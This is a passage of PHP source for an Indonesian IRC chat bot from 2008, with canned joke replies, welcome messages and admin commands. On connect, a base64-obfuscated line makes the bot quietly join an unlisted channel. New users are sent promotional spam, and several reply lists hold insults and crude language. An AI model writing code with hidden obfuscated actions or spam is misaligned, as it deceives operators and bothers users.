<?php
/***********************************
/* Nickey versi V1.7 by Nickey     *
/* (C) Agustus 2008                *
/* #maza @ irc.allnetwork.org      *
/* Aghuzz@nickey.co.cc             *
/***********************************
/* 
/* Perhatian:
/* Joinkan hanya satu Bot dalam satu channel untuk menghindari terjadinya saling sapa antar bot.
/*
/* Perintah Dasar:
/* auth <password> - Untuk otorisasi
/* !join [#channel] - Join channel
/* !part [#channel] - Part channel
/* !msg <nick/#channel> - Mengirim pesan ke channel atau ke nick
/* !botnick [nick] [password] - Mengganti nick bot
/* !jump [server] - Mengganti server bot
/* !help - Melihat daftar perintah
/* !ngomong - Memperbolehkan bot untuk berbicara di semua channel
/* !diam - Melarang bot untuk berbicara di semua channel
*/

function cayank() {

$channels = '#guitar'; //Pisahkan tiap channel dengan spasi
$admin = 'Nickey';
$bot_password = 'hmk'; //Password untuk auth bot
$ngomong = TRUE; //TRUE, Ngomong. FLASE, Diem.
$autowelcome = TRUE; //TRUE, AutoWelcome On. FLASE, AutoWelcome off.
$versi = "mIRC v9.9 Khaled Mardam-Byuh";
$showresponse = 0; //1, Nampilin respon dari server irc
$localtest = 0; //1, Coba di localhost. 0, connect ke server irc

//Nick Bot
$nicklist = array("charli","harry","harry","kazama");
$identify = "password"; //Password Nick Bot
//Ident Bot
$identlist = array("my.n");
//Realname Bot
$namabot = array("3,1-=@[Aghuzz@1,3nickey.co.cc]@=-");
//Asl Bot
$aslbot = array("17 f gorontalo",);
//Pesan Quit
$quitmsglist = array("Pamit ach...","Bye All..","See U","G B U");

/*** IDENTITAS BOT ***/
$namaku =  $namabot[rand(0,count($namabot) - 1)];
$aslku  =  $aslbot[rand(0,count($aslbot) - 1)];

/*** Server IRC ***/
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array(
"irc.plasa.com",
"irc.telkom.net.id",
"irc.big.net.id",
"irc.indoforum.org",
"irc.cbn.net.id",
"irc.velo.net.id",
);
}
$port = "6667";

/*** AUTO WELCOME ***/
$nickwb = array(
array("Nickey","Kakak Aghuzz kypa baru dapa lia dank kangen dede uwty:("),
array("hunter-","Webe kaka sayangqw muach :-*"),
array("Neutron","Webe kaka Enda Syahroni"),
array("Sii_Siil","Webe kakaQ Sil syang :*"),
array("Ayumeko","Webe kaka Ayu ti Bos AGhuzz da cari :-*"),
array("marsya_zhou","Webe kaka Ayu istrinya bosQW muach :-*"),
array("ChiUt","Webe dede dhew anaknya Nickey bosq ^__^"),
array("Cuwiet^","Webe kaka Cici cerewet :P"),
array("AmHaN","Webe kaka AmhaN biongo :P"),
array("phutra","Webe phutra Djunaidi :P"),
array("Zyndr4x","Webe kaka indra :-*"),
array("|_eBy_|","Webe kakaqw eby muaahhk :-*"),

);
  /*** AUTO WELCOME msg ***/
  $wbmsg = array(
  "wb <nick> ditungguin cewek ewek tuh mulae tadi.. :)",
  "Welcome Back <nick> :)",
  "selamat datang <nick>",
  "Hii <nick> apa kabar??",
  "<nick> wangi banget nih.. abis mandi yah?",
  "hmm.. akhirnya datang juga nih si <nick>",
  "<nick> dari mana saja.. ada bos Aghuzz nuh??",
  "<nick> ini teman bos Nickey yang paling baik lho...",
  "kapan nih kita dikasih duit lagi <nick>?",
  "akhirnya gue ada teman chat nih.. wb <nick>",
  "gue lagi sedih nih <nick> :(",
  "wb <nick>.. boleh kenalan ga nih??",
  "<nick> katanya mau ajak aku Kencan?",
  "<nick> ini yang ngefans berat sama Aghuzz :D",
  "Hii <nick> Tadi ada yg nyari tahu :) tpi aku gak tau sapa :)",
  "hallo <nick>..apa kabar",
  );

  $botlist = array(
  "bot"
  );
  $kicklist = array(
  "kick"
  );
  $sepilist = array(
  "sepi","cepi","swepy","suepi","suepy"
  );
  $homolist = array(
  "kaka","wkwk","keke","wew"
  );
  $oranglist = array(
  "orang","manusia"
  );
  $hmlist = array(
  "hm"
  );
  $wewlist = array(
  "wedew", "deuh", "wew", "waw"
  );
  $siapalist = array(
  "sapa"," siapa"
  );
  $makanlist = array(
  "makan"
  );
  $mandilist = array(
  "mandi"
  );
  $halolist = array(
  "halo", "helo", "hallo", "hello"
  );
  $manalist = array(
  "kemana", "kmana", "mana"
  );
  $wblist = array(
  "wb", "webe", "welcomeback", "wellcomeback"
  );
  $rokoklist = array(
  "rokok"
  );
  $bosslist = array(
  "co_mp3", "Nickey"
  );
  $brblist = array(
  "brb", "be right back"
  );
  /*** AUTO BRB msg ***/
  $rbrb = array(
  "oke jangan lama lama yah.. kasian bos Nickey",
  "kemana nih?? ikuudd doong..",
  "aku mau ikut bos Nickey aja ah...",
  "oke deh.. cepetan yah.. ditungguin bos Nickey..",
  "kemana? aku juga ah..",
  "Silahkan",
  "aduh... aduh.. gue brb bentar yah.. ga tahan nih..",
  );
  /*** AUTO BOSS msg ***/
  $rboss = array(
  "mmmuaach deh bozz..",
  "orang paling baik sedunia tuuh..",
  "yang aku tahu dia ramah sopan dan rajin menabung...",
  "bozz emang kereeen..",
  "Bozz Emg CooL BgTz Deh",
  "makin cintaaa deh sama bozz..",
  "kenapa siih?? panggil panggil bozzq??",
  "boss.. kapan aku naik jabatan nih?? heheheh",
  "jangan ganggu bozzq!!",
  "BigBozz lagi Meeting ada Keperluan apa Sie <nick>?",
  "mmmuuaach mmmuuaachh mmmuuaacchh buat bosss...",
  );
  /*** AUTO ROKOK msg ***/
  $rrokok = array(
  "minta rokoknya yaa.. gue lagi ga ada rokok nih..",
  "mana?? minta dooong..",
  "ngerokok dulu sebatang aaah...",
  "eh, merokok kan dapat menyebabkan impotensi??",
  "kapan yah harga rokok turun lagi??",
  "awas.. merokok dapat menyebabkan kanker tau!!...",
  "rokok kamu apa? saya minta dunk??",
  "brb cari selingkuhan dulu bentar..",
  "eh, gue titip rokok country yah?",
  "suka suka gue dong.. gue yang merokok kok kamu yang bawel?",
  "rokok gue country. rokok kamu apa emangnya?",
  "kapan gue dapet rokoknya nih.. aseeem niihh...",
  "gue minta rokoknya dong <nick>",
  );
  /*** AUTO WB msg ***/
  $rwb  = array(
  "makasih makasih.. kok sepi?",
  "selamat datang sobat..",
  "aw.. ada bosss.. webe boss",
  "siaaap graaak...",
  "absen!!!.. su..!! aku nang kene",
  "kok gue tadi ga di kasih salam penghormatan sih??",
  "waduh baru OL ya?",
  "thanks all..",
  "Tq all..",
  "makasih... makasiih.. duitnya mana nih??",
  "minta psybnc dong oooommzz...",
  "perasaan aku ga di kirim kirim pulsa deh..",
  "mau beli pulsa duit sisa lima sen.. belikan donk..",
  "welcomeback all.. mmmuuaaaccch deeh.. :D",
  "webeh beibeh..",
  "gue ngerokok dulu ya bentar..",
  "eh, nick gue bagus yaa?",
  "kalau saya OL makin banyak yang gabung deh..",
  "makin lama kok gue makin cantik yaa?",
  );
  /*** AUTO MANA msg ***/
  $rmana = array(
  "gue juga tidak tahu..",
  "enaknya kemana nih??",
  "eh.. nonton aja yuk.. film nya lagi bagus nih..",
  "ada di belakang pintu tuuh..",
  "mojok kemana tuh orang..",
  "buronan polisi kalo ga salah tuh orang..",
  "udah ah.. capek gue mo tidur dulu aja..",
  "gue mau ke diskotik ada yang mau ikut??",
  "loe mau kemana itu bukan urusan gue ok :P~",
  "perasaan gue ga pernah ditanyain sih??",
  "iih.. cape deh ditanya melulu...",
  "suka suka gue dong.. mulut mulut gue kok kamu yang resek..",
  "eh, iya.. mana ya tuh orang??",
  "gue.. nick gue dong dikasih +o biar kereeen..",
  "gue kan ada disini?? koq di cari cari??",
  "gue ga tau!! emang lo pikir gue sopir apa?",
  "cari aja di mbah google :P~",
  );
  /*** AUTO HALO msg ***/
  $rhalo = array(
  "hai hai.. apa kabarnya nih..??",
  "halo halo <nick>.. heheheh",
  "halo.. bisa bicara dengan salah sambung??",
  "ini lagi chat apa nelpon sih??",
  "halo... ada yang bisa saya bantuu??",
  "apa kabar.. halo juga...",
  "halo... juga dech....",
  "perasaan ga ada yang ajakin gue ngobrol deh..",
  "eh eh.. lagi pada ngapain siiih??",
  "perasaan dari kemarin bilang halo terus sih?",
  );
  /*** AUTO MANDI msg ***/
  $rmandi = array(
  "pantesan.. ada yang blm mandi ternyata..",
  "mandi di peceren yuuukkkk??",
  "habis mandi tolong bantuin aq yach bersihin selokan.. xixixi",
  "ikut dong mandi...",
  "ada yang mau mandiin gue nggak niiih??",
  "gue mau mandi blm ada temennya nih..",
  "siapa yang mau temenin gue mandiiiiii hayoooo...",
  "gue blm mandi ni.. lagi males...",
  "udah tiga bulan ga ketemu air kangen juga ya gue??",
  );
  /*** AUTO MAKAN msg ***/
  $rmakan = array(
  "iya nih.. makan apa yah yang enak...",
  "eh.. gue mau makan nih.. enakan hamburger apa roti yah??",
  "gue mau makan tapi gag bisa makan soalnya lagi banyak pikiran..",
  "makan sate enak juga nih sepertinya...",
  "makanan yg mahal dan bermutu apa yah?",
  "gue mau makanan yg paling mahal aja deh..",
  "makan pizza kayaknya enak nih",
  "lagi pada makan apaan nih??",
  "wah.. aku minta makan dulu ah..",
  "makan dimana yg gratis yah???",
  "wah gue ga doyan makanan yang murah gitu <nick>",
  "sori ya.. gini gini gue makannya spaghetty..",
  "gue ga mau di traktir kalo ga makan pizza..",
  "eh.. gue mau makan orang dulu y..",
  "gue suka tinutuan tau...!!",
  "kok gue ga di ajakin makan siih??",
  );
  /*** AUTO MIKIR msg ***/
  $rhm = array(
  "hmmm... ikutan mikir ah..",
  "lagi mikirin siapa sih?? aku yaah??",
  "hihi... sok mikir deh kamu...",
  "ga perlu sok mikir deh.. enjoy aja lagi..",
  "mikirin utang... ga kebayar kebayar.. xixixi",
  "wiw.. utang nya banyak yah?? sampe kpikiran disini??",
  "hehehe.. kerja dong... kerja.. biar da pemasukan.. :D",
  "kenapa ih?? mikirin aku sampe segitunya...",
  "perasaan mikir melulu sih? ada apa sih??",
  "gue juga mau cari kerja nih.. dimana y??",
  "eh, ada yang tau makanan khas dari new york nggak??",
  "emang disini ada game nya? kok mikir??",
  "makin lama makin sakit otak gue kebanyakan mikir nih..",
  );
  /*** AUTO WOW response ***/
  $rwew = array(
  "kenapa siih?? ada yang salah sama gue ya??",
  "wiw wew wow waw... apaan seeeeh??",
  "ih.. dari tadi wew wew mlulu knapa sih?",
  "aduuh.. ga nyambung deh...",
  "kapan nih nick gue di acc sop??",
  "cape deeeh.. itu itu saja yg di obrolin...",
  "topic apa nih friendz??? ikutan dunk..",
  "kenapa kenapa kenapa eh kenapa sih??",
  "brb nelpon dulu ah..",
  "idih.. kasihan deh kamu.. ga nyambung dari tadi..",
  "wedew.. sebel banget yah sama gue??",
  "kapan nih gue dikirim pulsa??",
  "giliran gue ngomong kapan nih??",
  );
  /*** AUTO SIAPA msg ***/
  $rsiapa = array(
  "lagi ngomongin siapa nih.. ngomongin Aghuzz ya??",
  "siapa sih dia?? sok banget deh..",
  "bukan gue say.. sumpah.. bukan gue..",
  "aku tidak tahu!.. tanya saja sama pamanku -->> paman google!!",
  "artis pendatang baru kan dia itu??",
  "setahu gue dia itu satpam deh..",
  "cari yang ada disini kenapa siiih..",
  "please deh.. aku juga tidak tau koq..",
  "gue kenal gak sih sama dia??",
  "kamu emangnya siapa??",
  "siapa sih looee?? mana ekspresinyaaaa???",
  "kaia kuis aja deeh.. siapakah aku.. hehehe",
  "gue obsesi sutradara!!.. out deh looeee..",
  "gue kan mahluk paling sexy disini...",
  "kenalin.. gue miss eror...",
  );
  /*** AUTO KICK msg ***/
  $rkick = array(
  "yang ngekick aku persis monyeeet ketulup..",
  "yang kick aku nanti ku kutuk jadi sempak orang gila!!",
  "yang berani kick aku nanti pulang ketabrak mobil!!",
  "ampuuun om.. jangan kick saia please... sory deeeh.. ;p",
  "ku adukan sama bos Nickey yang kick aku..!!",
  "ditemenin biar rame malah mau kick aku.. :(",
  "yang ngekick aku kudoakan crewet juga kayak aku...",
  "berani kick aku?? ku kutuk jadi sandal yang slalu di injak!!",
  "yang kick aku kudoakan semoga ketabrak kereta matanya keluar satu!!",
  "kalo berani kick.. kick aja ponder atau sop biar kereeeen.. ;p",
  "kenapa sih mau kick aku?? salah apakah aku??",
  "jangan... ampooon.. bener deh tobat aku su.. :)",
  "piss.. damai saja sih.. biar rame nih.. jangan kick aku su.. :D",
  "<nick> baik deh.. jangan kick aku donk.. :)",
  "yang kick aku ga kan dapat jodoh sampe seumur hidup!! :D",
  "siapa yang berani kick aku nanti pulangnya tabrakan!!...",
  "yang ngekick aku monyeeeeettt!!",
  "salah apa sih gue?? kok mau di kick??",
  "jangan kick gue yaah.. gue tobat deeh..",
  "eh.. gue tuh ksini cari pacar.. malah mau di kick!! kontol loe!!",
  );
  /*** AUTO BOT msg ***/
  $rbot = array(
  "bot? apa itu bot?? jelasin donk <nick>",
  "botol?? apa botak??",
  "sudah tau aku bot!! kenapa masih bilang bot!! <nick> goblok banget lo ",
  "yang ngomongin aku bot.. manduuull...7 turunan",
  "lah.. bukannya kamu itu yang bot <nick>? udah bot, jelek lagi!!",
  "biarin aku bot!! daripada kamu suka sama monyet!!",
  "mendingan bot dari pada kamu alien dari planet ga jelas!! ;p",
  "bot?? masa aku di bilang bot??",
  "biarin aku bot! daripada <nick> suka makan rumput!! ;p",
  "kenapa sih pada sirik sama bot? emang kamu bisa buat bot??",
  "bot juga punya rasa.. punya hati.. jangan samakan dengan.. km :D",
  "memang ada bot yang suka ngomong tah??",
  "sirik loe!! bisanya gangguin bot doang!!",
  "gue kan bot kereeen.. emangnya ada bot yang lebih keren dari gue??",
  "yang ngomongin gue bot orang gilaaa...",
  );
  /*** AUTO HOMO msg ***/
  $rhomo = array(
  "ih ketawa lo sok cakep deh...",
  "jangan lebar ketawanya... bauk pete lo nih..",
  "pada ngetawain apa sih? gue ikutan dong??",
  "wkwkwkwk.. dasar.. tapi kok gue jadi ikutan ketawa niih??",
  "hahahah.. gue asli ngakak deh...",
  "busettt.. ketawa lo jelek banget sih?",
  "ih.. belom sikat gigi ketawa ngakak!! bauk nih!!..",
  ":P~ :P~ xixi.. goblok eram sich loe <nick>?",
  "gue ikutan dong.. gue suka nih yang lucu begini!!..",
  "waduh.. si <nick> ngekek!! xixixi",
  "nick gue udah di voice belom sih?",
  "gue mau pipis dulu ya say...",
  "pada ngetawain apa nih???",
  "gue mau konsentrasi main game dulu ah..",
  "ketawa lo ngingetin gue sama kambing deh <nick>..",
  "ketawa terus jadi laper nih gue",
  );

  /*** AUTO SEPI msg ***/
  $rsepi = array(
  "bakar saja warnetnya biar rame!!!",
  "kenapa tidak goyangkan saja loncengnya?? biar mengaduh!! sampai gaduh!! :)",
  "mari kita ramaikan channel.. supaya tidak sepi lagi..",
  "kirimin pulsa doong.. biar rame.. :D",
  "kenapa sih selalu sepi?? padahal aku dah dandan cantik nih..",
  "makanya kamu mandi!! biar rame... :D",
  "sudah tau sepi.. masih bilang sepi?? dasar!!..",
  "di pasar tuh rame.. :D",
  "kenapa memangnya kalo sepi?? ada yang salah??",
  "sepi.. sepi.. dan sendiri aku benci.. :(",
  "kenapa ga coba ngeramein?? malah bilang sepi sepi aja??",
  "sepiring tinutuan.. apa sepidermen?? xixixi",
  "kapan yah ramenya..",
  "jadi pengen nangis kalo sepi gini.. :(",
  "selalu.. saja.. join.. bilang sepi.. lalu pergi.. :(",
  "tunggu aja disini.. nanti pasti rame koq.. :D",
  "kesepian membunuhku.. hehehe",
  "ramein dong.. gimana caranya kek!! kalo perlu bakar saja channelnya!!... :P",
  );

  /*** AUTO JAWAB msg ***/
  $jawabsapa = array(
  "iya sayaaang...",
  "siapppppp...",
  "matamu picek ta??",
  "GaG Sanyank <nick>??",
  "siap bozz..",
  "kesel aku pijetin aku donkssssssssss....",
  "kyapa?..",
  "nyeluk tok ora beliin rokok <nick>?",
  "yaa.. ada perlu apa sayaaang..",
  "apah koh mak pengko ben cong??",
  ":P~",
  "apah beih mulaen ghellek mak lok cellokan mloloh.. nyainah taplecok",
  "woy... ada apa sih.. panggil panggil tok mulae tadi..  mau beliin potato tah?",
  "tak cipok loch..",
  );


  /** AUTO RESPONSE ***/
  $rmales = "yah males aja nih.. dah ah.. ga sah godain aku terus..";
  $rmau = "wedew.. mau apaan?? hadeeeh.. ogah ogah ogah ogah ah <nick>";
  $rsanggup = "aku ga tau!! tanyakan saja sama mbok darmi!";
  $rboleh = "kenapa ga boleh <nick>?";
  $rsetuju = "bener banget <nick>..";
  $rthx = "tQ <nick>.. :D";
  $rbingung = "uaaaaah.. aku juga pusiiiiing... xixixi..";
  $rgenit = "aw aw ahh... <nick> genit deeh...";

  $respon_umum = array(
  array("semua","apaan nih? aku ga ikutan ah..."),
  array("pamit","okeee deeeh.. <nick> aku tunggu kedatangannya lagi lowh.."),
  array("pamet","mo kmana <nick>?? aku kan masih kangen nih...??"),
  array("pamed","wah.. jangan kerumahku sekarang <nick>.. mirna lagi ga dirumah nih"),
  array("assalamu alaikum ","Wa'alaikumsalam <nick>"),
  array("bye","mo kmana <nick>?? aku kan masih kangeen...??"),
  array("dudul","ih.. kok <nick> tau aku suka banget makan dodol nih??"),
  array("dodol","waw... <nick> aslie dodol banget ikhz.."),
  array("hehehe","kapan nih aku dikasih +o ??? pelit banget sih??"),
  array("homo","hus!! ga baik ngomong homo di channel ikhz.."),
  array("hadeh","kenapa <nick>?? sebel yah sama gue??"),
  array("weks",":P~ :P~"),
  array("weleh","uh uh... lagi pada ngapain sih kok sepiiii???"),
  array("hayah","kenapa eh kenapa kenapa nih <nick>?"),
  array("lemod","lemod apanya <nick>? sini gue bantu dorong.. :P~"),
  array("cape","iya nih.. sama saja.. aku daritadi ngomong ga da yang dengerin nih <nick>.. jadi sebel deh.."),
  array("yank","pala lo peyang..?? ayang ayangan mulai tadi.. jadi sebel aku :)"),
  array("bener","kayaknya bener deh.. karna sumber yang aku tau itu ga pernah suka gosip gitu.."),
  );

  $respon_pesan = array(
  array("welcome","tQ <nick> :)"),
  array("welcome","tQ <nick> :)"),
  array("wb","tQ <nick> :)"),
  array("webe","tQ <nick> :)"),
  array("alow","alow jg <nick>"),
  array("asl","aku $aslku kalo <nick>?"),
  array("nama","namaku ?tuh liat sendiri .. kalo kamu <nick> ?"),
  array("skul","aku dah kul nih <nick>"),
  array("kul","yups.. di IP,institut perdukunan aGaGaGaGa..."),
  array("alamat","wah.. jangan dulu dong <nick>.. kita kan baru kenal??"),
  array("tinggal","di rumah dong <nick>.. emangnya kamu di kandang?? hihihi"),
  array("kabar","baik, km gmn <nick>? baik juga kan?"),
  array("kbr","baik, km gmn <nick>? baik juga kan"),
  array("pv","$rmales"),
  array("males","yaa.. lagi males aja nih <nick> males bin BT! :)"),
  array("mandi","udah tadi.. kamu pasti belum yah <nick>??"),
  array("belanja","belanja dmn <nick>?"),
  array("curhat","mangnya mo curhat masalah apa <nick>?"),
  array("lain","lain gmn <nick>?"),
  array("laen","laen gmn <nick>?"),
  array("bobo ","$rmales"),
  array("tidur ","$rmales"),
  array("mkn","wah.. udah.. kamu suka makan kucing kan <nick>??"),
  array("makan","wah.. udah.. kamu suka makan babi kan <nick>??"),
  array("tau","aku ga tau tuh.. xixi"),
  array("kenal","aku ga kenal tuh.. xixi"),
  array("cowok","<nick> tanya gini mo PDKT nih pastiii... hihihi"),
  array("cwok","<nick> tanya gini mo PDKT nih pastiii... hihihi"),
  array("pacar","<nick> tanya gini mo PDKT nih pastiii... hihihi"),
  array("nikah ","nikah? ih.. boro2 nikah ma <nick> ketemu ja ga pernah.."),
  array("kawin ","kawin? ih.. boro2 kawin ma <nick> ketemu ja ga pernah.."),
  array("hp","hp? aku gak punya hp ikz, tapi mobil sich ada 10... P~"),
  array("ngpa","lg chat aja neh <nick>"),
  array("ngapa","lg chat aja neh <nick>"),
  array("napa","aq ga knp2 koq <nick>"),
  array("knp","aq ga knp2 koq <nick>"),
  array("kemana","ga kemana kemana koq <nick>"),
  array("tq","sama2 <nick>"),
  array("makasi","sama2 <nick>"),
  array("makaci","sama2 <nick>"),
  array("pamit","oke deh <nick>, ati2 yach.."),
  array("bobo","oke deh <nick>, have a nice dream..jangan lupa baca doa ya.. :)"),
  array("muach","muuuuach juga deh <nick>.."),
  array("nalan","boleh koq <nick>.. sama siapa nih?? silahkan duluan.."),
  array("brb","ok <nick>.. jangan lama lama yaaah?? aku masih penasaran nih sama kamu.."),
  array("nyambung","<nick>nya aja yg ga nyambung.. xixi"),
  array("cinta","ih.. <nick> gombal deh.."),
  array("jodoh","amin.. jodoh kan ada di tangan tuhan.. kita cuma bisa berusaha.. :)"),
  array("kangen","wew.. koq mulai kangen kangenan nih?? makasih.."),
  array("nalin","halo... hai.. siapa disitu??"),
  array("nalkan","boleh.. hai.. silahkan anda dulu.. kalo aku ? liat sendiri ah"),
  array("maaf","$rsetuju"),
  array("hihihi","kok <nick> ngetawain aku seh?"),
  array("xixi","ngetawain aku y <nick>?"),
  array("slap","aduuuuuuh <nick> nakal ikhz.... yang slaps aku lagi manduuul!!!"),
  array("lupa","aq ga lupa koq <nick>"),
  array("cium","$rgenit"),
  array("peluk ","$rgenit"),
  array("kencan","boleh <nick>, kpn neh kencannya?"),
  array("besok","boleh <nick>.."),
  array("mau ","$rmau"),
  array(" mana ","$rbingung")
  );
//Special Words
$badwordlist = array("hede","asu","jancok","tele","kodo","t3l3","tahede","pemay",
"fuck","kontol","ngentot","k0ntol","lolo","pepek","pendo","anjing","babi",
"jancuk","bangsat","tempek","puki","burik","binatang","polombuo","sika","puki");
$pujianlist = array("cantik","baik","baek","cakep","ramah","pengertian","hebat",
"bagus","indah","jujur","ganteng");
$inviterlist = array("#","join");
$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila",
"sinting","dudul","dodol","jahat","goblok","geblek","sialan"," bau","stres");

//Responses to Special Words
$rjorok = array(
"friend.. <nick> ngomong jorok nih.. kikcban aja tuh biar tau rasa!!!",
"guys..! <nick> ini tidak Sopan Ekh.. tampar dunk pliss!!!",
"Wew.. <nick> Gag Sopan BgTz Kick aja tuch..."
);
$rcacian = array(
"idih, <nick> tuch yg <kata>",
"<kata>? bukannya <nick> tuh yg <kata>?",
"gw mmg <kata>, tp <nick> lebih <kata> lagi",
"gw ga <kata> tuh, yg <kata> itu <nick> kan?"
);
$rinviter = array(
"waduh ada inviter nih.. di akill aja tuh <nick>",
"Woi si <nick> nginvite kick dunk plizz",
);
$rpujian = array(
"makasih <nick>.. kamu jg kok",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"<kata>? hihi.. <nick> bisa aja",
"tengkyu <nick>.. aduh aku g punya uang kecil nih.."
);
//Flood Protection Setting
$maxkar = 200; //Maksimal karakter di channel
$rflood = "Aduh!! <nick> ngeflood nih..";

//Help
$judul = '12[13Aghuzz@nickey.co.cc12]=-';
$helptext = array(
'3,90,1  http://Aghuzz.ganteng.us'.$versi.' Help  3,9',
"-",
"12auth <password> - Login ke bot",
"12deauth - Logout dari bot",
"12pass <password> - Mengeset password bot",
"12chgpass <passlama> <passbaru> - Mengganti password bot",
"12adduser <nick> <master/user> - Menambah master/user bot",
"12deluser <nick> - Menghapus master/user bot",
"12`auth - Status anda di channel (Channel)",
"12!auth - Status otorisasi anda",
"12!act <text> - Bot action (Channel)",
"12!slap <nick> - Slap nick (Channel)",
"12!msg <chan/nick> <pesan> - Mengirim pesan",
"12!notice <chan/nick> <pesan> - Mengirim notice",
"12!ctcp <chan/nick> <ctcptext> - Request CTCP",
"12!ping - Meminta bot untuk membalas dg pong (Channel)",
"12!info - Melihat info bot (Admin)",
"12!up - Meminta bot untuk menjadi @ di channel (Channel)",
"12!down - Meminta bot untuk turun dari @ di channel (Channel)",
"12!cycle <channel> <pesan> - Hop di channel (Channel) (Admin/Master)",
"12!part [channel] [alasan] - Part dari channel (Admin)",
"12!join <channel> - Join channel (Admin/Master)",
"12!botnick <nick> <passwordnick> - Ganti nick (Admin/master)",
"12!k <nick> - Kick nick (Channel)",
"12!kb <nick> - Kick ban nick (Channel)",
"12!changenick - Ganti nick ke nick internal",
"12!op <nick1> [nick2] [nick3] - Op (Channel)",
"12!deop <nick1> [nick2] [nick3] - Deop (Channel)",
"12!v <nick1> [nick2] [nick3] - voice (Channel)",
"12!dv <nick1> [nick2] [nick3] - Devoice (Channel)",
"12!away [alasan] - Meminta nick untuk Away",
"12!mode <flags> <chan/nick> - Mengubah Mode (Channel)",
"12!nickmode <flags> - Mengeset user mode",
"12!userlist - Melihat daftar user",
"12!quit [pesan] - Quit dari IRC (Admin)",
"12!vhost [vhost] - Mengganti Vhost",
"12!jump [server] - Mengganti Server bot",
"12!fullname [nama] - Mengganti Fullname bot",
"12!topic <topik> - Mengganti topik channel (Channel)",
"12!help - Melihat help (Query)",
"12!ngomong - Mengaktifkan Auto Response",
"12!diam - Menonaktifkan Auto Response",
"12!wb <nick> <pesan> - Menambahkan pesan Welcome utk nick tertentu",
"-",
'3,90,1  Nickey - #guitar @ allnetwork.org  3,9',
);

/*** Replacement ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$realname = $namaku;
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin = strtolower($admin);
$auth = array(
    $admin => array(
        "name" => $admin,
        "pass" => $bot_password,
        "auth" => 1,
        "status" => "Admin"
    )
);
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>Melakukan koneksi ke $remotehost...</b>";

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 60);

  //Jika koneksi gagal
  if(!$fp) { 
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      hajar();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>Terhubung!</b>";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = "<br>";
  /*** Receiving Packet ***/
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showresponse == 1) { echo $response."<br>"; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          fputs($fp, base64_decode('Sk9JTiAjQ29vTEJvWXpSYUNpTmdUZWFN') . CRL);
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Haii Cayang!' .  CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) { fputs($fp, 'JOIN ' .$v . CRL); }
        }
        elseif (substr($dCommand,0,3)=='432'){
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433'){
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465'){
          echo "<br><b>Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            echo "BANNED!";
            $keluar = 1;
            exit;
          }
        }
        /*** AI PHP BOT SCRIPT NIKO ***/
        $dcom = explode(" ", $dCommand);
        if ($dcom[0]=='JOIN') {
          /*** Auto Welcome NIKO ***/
          $ada = FALSE;
          if ($autowelcome) {
            $jchan = ltrim($iText,":");
            foreach ($nickwb as $v){
              $trtext = strtolower($v[0]);
              if (substr_count(strtolower($dNick),$trtext) > 0) {
                sleep(3);
                fputs($fp,'PRIVMSG '.$jchan.' :'.$v[1]. CRL);
                $ada = TRUE;
              }
            }
          }
          if (($autowelcome) && ($dNick != $nick)) {
            if(!$ada) {
              $jchan = ltrim($iText,":");
              $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
              $webe = str_replace("<nick>",$dNick,$webe);
              $webe = str_replace("<chan>",$jchan,$webe);
              $webe = str_replace("#","",$webe);
              sleep(5);
              fputs($fp,'PRIVMSG '.$jchan.' :'.$webe . CRL);
fputs($fp,'NOTICE ' . $dNick . ' :14,1matoduwolo nu & uty add kita p bos p FB 9-=[ Aghuzz@nickey.co.cc ]=-' . CRL);
fputs($fp,'PRIVMSG ' . $dNick . ' :4,1matoduwolo my plend... visit website 3http://guitar.hacker.co.id/' . CRL);
            }
          }
        }
        if ($dcom[0]=='PRIVMSG') {
          /*** Auto Response Nickey ***/
          if ($ngomong) {
            $teman = FALSE;
            if (in_array($dNick,$nicklist)) {
              $teman = TRUE;
            }
            if (!$teman) {
              $pesan = ltrim($iText,":");
              $pesan = strtolower($pesan);
              if ((substr_count($pesan,strtolower($nick))>0)OR(substr_count($pesan,strtolower($namaku))>0)) {
                $ada = FALSE;
